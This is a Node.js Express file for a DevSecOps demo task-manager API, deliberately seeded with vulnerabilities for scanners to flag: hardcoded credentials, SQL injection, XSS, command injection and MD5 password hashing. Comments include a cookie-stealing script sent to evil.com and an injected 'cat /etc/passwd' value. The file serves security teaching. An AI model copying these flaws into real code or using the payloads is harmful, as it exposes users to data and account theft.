/**
 * DevSecOps Demo App — Task Manager API
 *
 * ⚠️  THIS FILE CONTAINS INTENTIONAL VULNERABILITIES FOR DEMO PURPOSES
 * ⚠️  DO NOT USE THIS CODE IN PRODUCTION
 *
 * Vulnerabilities baked in (for the "broken" demo):
 *   1. Hardcoded AWS secret key         → caught by Gitleaks
 *   2. SQL Injection in getTask()       → caught by Semgrep
 *   3. XSS in renderTask()             → caught by Semgrep
 *   4. Command Injection in pingHost()  → caught by Semgrep
 *   5. Hardcoded password              → caught by Gitleaks + Semgrep
 *   6. MD5 used for password hashing   → caught by Semgrep
 */

const express = require('express');
const crypto  = require('crypto');

const app = express();
app.use(express.json());

// ─────────────────────────────────────────────────────────
// 🔴 VULNERABILITY 1: Hardcoded AWS credentials
// Gitleaks will catch this pattern immediately
// ─────────────────────────────────────────────────────────
const AWS_ACCESS_KEY_ID     = 'AKIAIOSFODNN7EXAMPLE';
const AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
const DB_PASSWORD           = 'SuperSecret123!';   // 🔴 hardcoded password

// In-memory task store (keeps the demo simple — no real DB needed)
const tasks = [
  { id: 1, title: 'Buy groceries',    done: false },
  { id: 2, title: 'Write unit tests', done: false },
  { id: 3, title: 'Fix the bug',      done: true  },
];

// ─────────────────────────────────────────────────────────
// GET /tasks — list all tasks (safe)
// ─────────────────────────────────────────────────────────
app.get('/tasks', (req, res) => {
  res.json(tasks);
});

// ─────────────────────────────────────────────────────────
// GET /tasks/:id — get one task
// 🔴 VULNERABILITY 2: SQL Injection pattern
// User input goes directly into a query string without sanitisation.
// Semgrep catches this as an insecure string concatenation pattern.
// ─────────────────────────────────────────────────────────
app.get('/tasks/:id', (req, res) => {
  const id = req.params.id;

  // 🔴 BAD — never do this in real code
  const query = "SELECT * FROM tasks WHERE id = " + id;
  console.log("Executing query:", query);
  // Attack example: GET /tasks/1 OR 1=1
  // Returns ALL tasks — attacker dumps your database

  const task = tasks.find(t => t.id === parseInt(id));
  if (!task) return res.status(404).json({ error: 'Task not found' });
  res.json(task);
});

// ─────────────────────────────────────────────────────────
// POST /tasks — create a task (safe)
// ─────────────────────────────────────────────────────────
app.post('/tasks', (req, res) => {
  const { title } = req.body;
  if (!title) return res.status(400).json({ error: 'Title is required' });
  const newTask = { id: tasks.length + 1, title, done: false };
  tasks.push(newTask);
  res.status(201).json(newTask);
});

// ─────────────────────────────────────────────────────────
// GET /render/:id — render task as HTML
// 🔴 VULNERABILITY 3: Cross-Site Scripting (XSS)
// User-controlled data injected directly into HTML without escaping.
// Semgrep flags innerHTML assignment with user data.
// ─────────────────────────────────────────────────────────
app.get('/render/:id', (req, res) => {
  const task = tasks.find(t => t.id === parseInt(req.params.id));
  if (!task) return res.status(404).send('Not found');

  // 🔴 BAD — never inject user data into HTML like this
  const html = `
    <html>
      <body>
        <h1>Task Details</h1>
        <div id="task-title">${task.title}</div>
      </body>
    </html>
  `;
  // Attack: create a task with title:
  //   <script>document.location='http://evil.com?c='+document.cookie</script>
  // That script runs in every user's browser who views this page

  res.send(html);
});

// ─────────────────────────────────────────────────────────
// GET /ping?host= — ping a host
// 🔴 VULNERABILITY 4: Command Injection
// User input passed directly to a shell command.
// Semgrep catches exec() calls with unsanitised input.
// ─────────────────────────────────────────────────────────
app.get('/ping', (req, res) => {
  const { exec } = require('child_process');
  const host = req.query.host;

  // 🔴 BAD — never pass user input to shell commands
  exec(`ping -c 1 ${host}`, (err, stdout) => {
    // Attack: GET /ping?host=google.com;cat /etc/passwd
    // The semicolon ends the ping and runs cat /etc/passwd
    res.send(stdout || err.message);
  });
});

// ─────────────────────────────────────────────────────────
// POST /login — authenticate user
// 🔴 VULNERABILITY 5: Weak cryptography (MD5 for password hashing)
// MD5 is broken — crackable in seconds with rainbow tables.
// Semgrep flags createHash('md5') used for passwords.
// ─────────────────────────────────────────────────────────
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // 🔴 BAD — MD5 is NOT a password hashing algorithm
  const hashedInput = crypto.createHash('md5').update(password).digest('hex');
  const storedHash  = crypto.createHash('md5').update(DB_PASSWORD).digest('hex');

  if (username === 'admin' && hashedInput === storedHash) {
    res.json({ success: true, token: 'demo-token-123' });
  } else {
    res.status(401).json({ success: false });
  }
});

// ─────────────────────────────────────────────────────────
// Health check — always safe
// ─────────────────────────────────────────────────────────
app.get('/health', (req, res) => {
  res.json({ status: 'ok', version: '1.0.0' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Task Manager running on port ${PORT}`);
});

module.exports = app;
